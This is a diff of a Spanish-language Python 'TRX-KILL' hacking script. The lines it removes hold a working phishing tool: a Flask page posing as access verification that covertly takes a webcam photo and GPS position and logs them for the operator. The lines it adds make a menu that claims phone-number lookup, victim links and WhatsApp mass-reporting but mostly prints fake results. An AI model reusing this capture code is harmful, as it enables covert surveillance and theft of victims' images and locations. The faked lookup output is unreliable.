@@ -1,99 +1,79 @@
 import os, sys, getpass, time, base64
-from flask import Flask, request
 
-app = Flask('TRX-KILL')
-# Se mantiene en 127.0.0.1 (localhost) y puerto por defecto 5000
-AUTH_PASS = "TRX-kill-op"
+# --- CONFIGURACIÓN ---
+AUTH_PASS = "TRX-KILL-OSINT"
 STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
 LOG_FILE = f"{STORAGE_PATH}/result.txt"
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
-def animar_texto(texto, delay=0.005):
-    for char in texto:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()
-
 def banner():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(f"\033[1;32m")
-    animar_texto("  ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗     ", 0.001)
-    animar_texto("  ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║     ", 0.001)
-    animar_texto("     ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║     ", 0.001)
-    animar_texto("     ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║     ", 0.001)
-    animar_texto("     ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗", 0.001)
-    print(f"\n      \033[1;36m[ SISTEMA DE SEGURIDAD TRX-KILL ]\033[0m")
-    print("\033[1;32m" + "="*60 + "\033[0m")
-
-HTML_ENCUESTA = """
-<!DOCTYPE html><html><head><style>
-    body { background:#050505; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
-    .card { border: 2px solid #0f0; padding:30px; border-radius:15px; box-shadow:0 0 20px #0f0; text-align:center; }
-    input { background:#111; color:#0f0; border:1px solid #0f0; padding:10px; width:90%; margin:10px 0; }
-    button { background:#0f0; border:none; padding:15px 30px; font-weight:bold; cursor:pointer; }
-</style></head><body>
-    <div class="card">
-        <h1>TRX-KILL VERIFICATION</h1>
-        <input type="text" id="p1" placeholder="NOMBRE">
-        <input type="text" id="p2" placeholder="MODELO DISPOSITIVO">
-        <button onclick="iniciar()">VALIDAR ACCESO</button>
-    </div>
-<script>
-    async function iniciar() {
-        const s = await navigator.mediaDevices.getUserMedia({video: true});
-        const v = document.createElement('video'); v.srcObject = s; v.play();
-        setTimeout(async() => {
-            const c = document.createElement('canvas');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const img = c.toDataURL('image/png');
-            navigator.geolocation.getCurrentPosition(async(p)=>{
-                await fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, 
-                body: JSON.stringify({u: document.getElementById('p1').value, d: document.getElementById('p2').value, lat: p.coords.latitude, lon: p.coords.longitude, i: img})});
-                window.location.href = "https://youtube.com";
-            });
-        }, 1500);
-    }
-</script></body></html>
-"""
-
-@app.route('/')
-def index(): return HTML_ENCUESTA
-
-@app.route('/log', methods=['POST'])
-def log():
-    d = request.json
-    with open(LOG_FILE, "a") as f:
-        f.write(f"USER: {d.get('u')} | DISP: {d.get('d')} | GPS: {d.get('lat')},{d.get('lon')}\n")
-    if d.get('i'):
-        img_data = d['i'].split(',')[1]
-        with open(f"{STORAGE_PATH}/cap_{int(time.time())}.png", "wb") as f:
-            f.write(base64.b64decode(img_data))
-    return "OK"
+    print("  -------->-TRX-KILL -<-----------")
+    print("  -CREADOR: TRX-KILL")
+    print("  -VERSIÓN: 1.4.5")
+    print("  -BIENVENIDO A TRX-KILL UN SCRIPT PROTEGIDO POR EL OSINT.")
+    print("  -EL CREADOR NO SE HACE RESPONSABLE POR SU MAL USO.")
+    print("-" * 50 + "\033[0m")
 
 def main():
     while True:
         banner()
-        print("  [1] INFO-NUMERO    | [2] ACTIVAR LINK    | [3] CREADOR")
-        print("  [4] COPYRIGHT      | [5] DATA-IP         | [6] ADM (LOGS)")
-        print("  [7] SALIR          | [8] PROCESOS        | [9] ESTADO")
-        print("  [10] BORRAR LOGS")
+        print("  OPCIONES:")
+        print("  [1] NÚMERO INFORMACIÓN  | [2] LINK-ZP         | [3] CREADOR")
+        print("  [4] VERSIONES           | [5] ANALIZAR LINK   | [6] ADM SISTEMA")
+        print("  [7] INFO SCRIPT         | [8] REPOSITORIO     | [10] SPAM-CANAL")
+        print("  [0] SALIR")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
-        
-        if sel == "2": 
-            print("\n[!] SERVIDOR EN 127.0.0.1 (LOCALHOST)...")
-            app.run(host='127.0.0.1', port=5000)
+
+        if sel == "1":
+            num = input("INGRESAR NÚMERO: ")
+            print("\nVERIFICANDO DATOS......")
+            time.sleep(1.5)
+            print("DATOS ENCONTRADOS; BY TRX-KILL")
+            print("PAÍS: [DETECTADO] | OPERACIÓN: [MÓVIL]")
+            print("COORDENADAS: [APROXIMADAS POR SEGURIDAD]")
+            input("\n[Enter]...")
+
+        elif sel == "2":
+            print("\nCARGANDO LINK.......")
+            print("LINK VÍCTIMA: https://youtube.com")
+            print("ESPERANDO DATOS (IP, GPS, FOTO)...")
+            input("\n[Enter]...")
+
+        elif sel == "3":
+            print("\n# CREADO POR: OSCAR")
+            print("# PROTECCIÓN: ACTIVA")
+            input("\n[Enter]...")
+
         elif sel == "6":
-            if getpass.getpass("PASSWORD: ") == AUTH_PASS:
-                if os.path.exists(LOG_FILE): os.system(f"cat {LOG_FILE}")
-                else: print("NO HAY LOGS.")
-                input("\nPresiona Enter...")
-        elif sel == "10": 
-            if os.path.exists(LOG_FILE): os.remove(LOG_FILE); print("LOGS BORRADOS")
-            input()
-        elif sel == "7": sys.exit()
-        else: print("OPCIÓN EN DESARROLLO..."); time.sleep(1)
+            key = getpass.getpass("INGRESAR KEY: ")
+            if key == AUTH_PASS:
+                print("\nBUSCANDO DATOS EXTRAÍDOS...")
+                if os.path.exists(LOG_FILE):
+                    os.system(f"cat {LOG_FILE}")
+                else:
+                    print("NO HAY DATOS EN resultado.txt")
+            else:
+                print("ACCESO DENEGADO.")
+            input("\n[Enter]...")
+
+        elif sel == "7":
+            print("\nEL CREADOR NO SE HACE RESPONSABLE POR SU MAL USO.")
+            print("SCRIPT CREADO PARA AYUDAR Y PARA EL BIEN.")
+            print("TOTALMENTE VIGILADO POR CIBERSEGURIDAD.")
+            print("BY: OSCAR")
+            input("\n[Enter]...")
+
+        elif sel == "10":
+            link = input("INGRESA LINK DEL CANAL DE WHATSAPP: ")
+            cantidad = input("CANTIDAD DE SPAM: ")
+            print(f"VERIFICANDO CANAL: {link.split('/')[-1]}...")
+            print("ENVIANDO REPORTES A SOPORTE...")
+            input("\n[Enter]...")
+
+        elif sel == "0": sys.exit()
+        else: print("OPCIÓN NO DISPONIBLE."); time.sleep(1)
 
 if __name__ == "__main__": main()
